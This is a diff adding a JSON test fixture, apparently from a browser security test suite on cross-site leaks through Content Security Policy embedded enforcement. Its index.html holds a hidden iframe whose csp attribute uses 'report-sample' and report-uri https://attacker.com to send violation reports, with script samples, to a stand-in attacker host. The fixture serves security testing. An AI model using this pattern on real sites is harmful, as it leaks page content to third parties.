@@ -1,0 +1,13 @@
+```json
+{
+  "c732779": {
+    "url_queue.txt": "https://leak.test/CSP/c732779/main\nhttps://a.test/report/?leak=baseline\n",
+    "leak.test": {
+      "main": {
+        "index.html": "<iframe src=\"https://vuln.shhnjk.com/allowcsp.php\" style=\"display:none;\" csp=\"script-src 'sha256-test' 'report-sample'; report-uri https://attacker.com;\"></iframe>\n",
+        "headers.json": "[{\n  \"key\": \"Allow-CSP-From\",\n  \"value\": \"https://test.shhnjk.com\"\n}]"
+      }
+    }
+  }
+}
+```
